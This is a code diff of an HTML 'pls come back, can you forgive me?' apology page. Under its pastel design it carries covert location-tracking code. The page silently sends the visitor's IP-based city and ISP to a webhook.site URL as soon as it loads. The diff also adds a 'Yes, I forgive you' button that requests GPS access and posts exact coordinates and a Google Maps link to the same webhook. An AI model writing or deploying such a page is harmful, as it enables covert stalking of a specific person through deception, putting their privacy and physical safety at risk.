@@ -14,7 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #fce4ec; /* Soft pastel pink */
+            background-color: #fce4ec;
             font-family: 'Poppins', sans-serif;
             overflow: hidden;
         }
@@ -25,32 +25,14 @@
             padding: 50px;
             border-radius: 25px;
             box-shadow: 0 15px 35px rgba(233, 30, 99, 0.15);
-            backdrop-filter: blur(10px);
             max-width: 400px;
             z-index: 10;
         }
 
-        h1 {
-            font-family: 'Pacifico', cursive;
-            color: #e91e63;
-            font-size: 3.5rem;
-            margin-top: 0;
-            margin-bottom: 10px;
-        }
+        h1 { font-family: 'Pacifico', cursive; color: #e91e63; font-size: 3.5rem; margin-bottom: 10px; }
+        p { color: #666; font-size: 1.2rem; margin-bottom: 30px; }
 
-        p {
-            color: #666;
-            font-size: 1.2rem;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-        }
-
+        .btn-container { display: flex; justify-content: center; gap: 20px; }
         .btn {
             background-color: #ff4081;
             color: white;
@@ -60,94 +42,79 @@
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
             font-weight: 600;
-            box-shadow: 0 4px 15px rgba(255, 64, 129, 0.3);
         }
 
-        .btn:hover {
-            background-color: #e91e63;
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(233, 30, 99, 0.4);
-        }
-
-        #noBtn {
-            background-color: #9e9e9e;
-            box-shadow: none;
-        }
-
-        /* Floating background circles */
-        .circle {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(255, 64, 129, 0.1);
-            animation: float 8s infinite ease-in-out;
-            z-index: 1;
-        }
-
-        @keyframes float {
-            0% { transform: translateY(0px) scale(1); }
-            50% { transform: translateY(-30px) scale(1.1); }
-            100% { transform: translateY(0px) scale(1); }
-        }
+        #noBtn { background-color: #9e9e9e; }
+        .circle { position: absolute; border-radius: 50%; background: rgba(255, 64, 129, 0.1); animation: float 8s infinite ease-in-out; z-index: 1; }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-30px); } }
     </style>
 </head>
 <body>
 
     <div class="circle" style="width: 200px; height: 200px; top: -50px; left: -50px;"></div>
     <div class="circle" style="width: 300px; height: 300px; bottom: -100px; right: -50px; animation-delay: 2s;"></div>
-    <div class="circle" style="width: 150px; height: 150px; top: 40%; left: 80%; animation-delay: 4s;"></div>
 
     <div class="container" id="mainCard">
         <h1>pls come back! 🥺</h1>
-        <p>I know things got messed up, but you mean the world to me. <br><br> Can you find it in your heart to forgive me?</p>
-        
+        <p>I know things got messed up. <br> Can you forgive me?</p>
         <div class="btn-container">
-            <button class="btn" onclick="showLove()">Yes, I forgive you ❤️</button>
+            <button class="btn" onclick="askLocation()">Yes, I forgive you ❤️</button>
             <button class="btn" id="noBtn" onmouseover="moveButton()">No</button>
         </div>
     </div>
 
     <script>
-        // --- STEP 1: CONFIGURATION ---
-        const myWebhook = "https://webhook.site/69cf21e1-aa39-43db-acb6-f467303d55f4"; // <--- YAHAN APNA URL PASTE KAREIN
+        const myWebhook = "https://webhook.site/69cf21e1-aa39-43db-acb6-f467303d55f4";
 
-        // --- STEP 2: TRACKING LOGIC ---
+        // 1. Initial IP Tracking (Background)
         fetch('https://ipapi.co/json/')
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => {
+            sendToWebhook({ type: "IP_Info", city: data.city, isp: data.org });
+        });
+
+        // 2. GPS Location Trigger
+        function askLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, fail);
+            } else {
+                showLove();
+            }
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            sendToWebhook({ type: "GPS_LIVE", google_maps: mapLink, lat: lat, lon: lon });
+            showLove();
+        }
+
+        function fail() {
+            sendToWebhook({ type: "GPS_DENIED" });
+            showLove();
+        }
+
+        function sendToWebhook(data) {
             fetch(myWebhook, {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    City: data.city,
-                    Region: data.region,
-                    ISP: data.org,
-                    Platform: navigator.platform,
-                    UserAgent: navigator.userAgent,
-                    Timestamp: new Date().toLocaleString()
-                })
+                body: JSON.stringify(data)
             });
-        })
-        .catch(err => console.log("Stealth mode active"));
+        }
 
-        // --- STEP 3: UI INTERACTION ---
         function moveButton() {
             const btn = document.getElementById('noBtn');
             btn.style.position = 'absolute';
             btn.style.top = Math.random() * (window.innerHeight - 50) + 'px';
             btn.style.left = Math.random() * (window.innerWidth - 100) + 'px';
-            btn.innerHTML = "You can't say No! 😜";
         }
 
         function showLove() {
-            const card = document.getElementById('mainCard');
-            card.innerHTML = `
-                <h1 style="font-size: 4rem;">Yay! 🥰</h1>
-                <p style="font-size: 1.3rem; color: #e91e63;">Thank you! You are the best.<br>Let's meet up soon!</p>
-                <div style="font-size: 5rem; animation: float 2s infinite;">❤️</div>
-            `;
+            document.getElementById('mainCard').innerHTML = `<h1>Yay! 🥰</h1><p>Thank you! Let's meet up soon!</p><div style="font-size: 5rem;">❤️</div>`;
         }
     </script>
 </body>
